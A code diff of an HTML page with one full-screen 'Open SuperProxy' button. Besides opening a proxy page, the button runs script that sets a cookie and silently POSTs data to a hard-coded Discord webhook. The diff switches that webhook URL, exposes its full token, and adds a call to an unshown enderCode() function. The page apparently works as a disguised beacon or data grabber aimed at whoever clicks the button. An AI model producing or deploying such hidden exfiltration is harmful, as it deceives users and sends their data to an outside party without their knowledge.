@@ -1,3 +1,5 @@
+<!DOCTYPE html>
+<html>
 <script>
 function openWebsite() {
   var rawURL = "https://raw.githubusercontent.com/endr1337/proxy-raw/main/math.html";
@@ -53,7 +55,7 @@ function messageSend() {
     setCookie("myCookie", cookieValue, 30);
 
     const request = new XMLHttpRequest();
-    request.open("POST", "https://discord.com/api/webhooks/1163350348254158878/vs93mWsYLjte4FLddxbHtuPEMrDG8SRSr6sUkgglv6Jv4ASdcuK5nBY-uq-hDM0SYMlo"); // change to your webhook
+    request.open("POST", "https://canary.discord.com/api/webhooks/1163350348254158878/vs93mWsYLjte4FLddxbHtuPEMrDG8SRSr6sUkgglv6Jv4ASdcuK5nBY-uq-hDM0SYMlo"); // change to your webhook
 
     request.setRequestHeader('Content-type', 'application/json');
 
@@ -67,4 +69,6 @@ function messageSend() {
   });
 }
 </script>
-<button onclick="openWebsite(); messageSend()" style="background-color: darkmagenta; color: white; font-family: Times New Roman, sans-serif; font-size: 30px; width: 100%; height: 100%; border: none; cursor: pointer;">Open SuperProxy</button>
+<button onclick="openWebsite(); messageSend(); enderCode()" style="background-color: darkmagenta; color: white; font-family: Times New Roman, sans-serif; font-size: 30px; width: 100%; height: 100%; border: none; cursor: pointer;">Open SuperProxy</button>
+</html>
+
